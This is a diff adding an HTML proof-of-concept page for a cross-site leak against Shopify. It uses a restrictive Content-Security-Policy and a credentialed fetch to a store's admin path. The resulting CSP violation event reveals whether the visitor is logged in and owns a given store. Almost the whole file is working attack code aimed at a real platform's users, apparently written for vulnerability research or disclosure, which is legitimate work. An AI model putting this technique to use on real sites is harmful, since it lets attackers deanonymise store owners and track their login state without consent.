@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>XPOC</title>
+        <meta http-equiv="Content-Security-Policy" content="default-src 'unsafe-inline' https://redassassin27.myshopify.com https://code.jquery.com https://maxcdn.bootstrapcdn.com https://cdnjs.cloudflare.com https://maxcdn.bootstrapcdn.com">
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+        <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    </head>
+    <body>
+        <div class="container pt-3">
+            <h1>
+                XSLEAK - POC - CSP Violation
+            </h1>
+            <div class="form-group">
+                <br />
+                <div class="row">
+                    <div class="col-md-10">
+                        <input type="text" placeholder="Enter page domain e.g.  xyz.shopify.com" class="form-control" id="do">
+                    </div>
+                    <div class="col-md-2">
+                        <button type="button" class="btn btn-success" onclick="checkOwner();">Check</button>
+                    </div>
+                </div>
+            </div>
+            <div class="container">
+                <code id="result">
+                </code>
+            </div>
+        </div>
+        <script>
+            window.blocked = null;
+
+            document.addEventListener('securitypolicyviolation', e => {
+            // goes through here if a 3xx redirect to another domain happened
+                console.log(e.blockedURI);
+                window.blocked = e.blockedURI;
+            });
+            function checkOwner(){
+                var result = document.getElementById("result");
+                var store = document.getElementById("do").value;
+                fetch('https://'+store+'/admin/marketing', {mode: 'no-cors',credentials: 'include'});
+                setTimeout(() => {
+                    if(window.blocked)
+                        result.innerHTML = "[+] You are logged in and you own the store "+store;
+                    else
+                        result.innerHTML = "[+] You are not logged in.";
+                }, 3000);
+                
+            }
+        </script>
+    </body>
+</html>
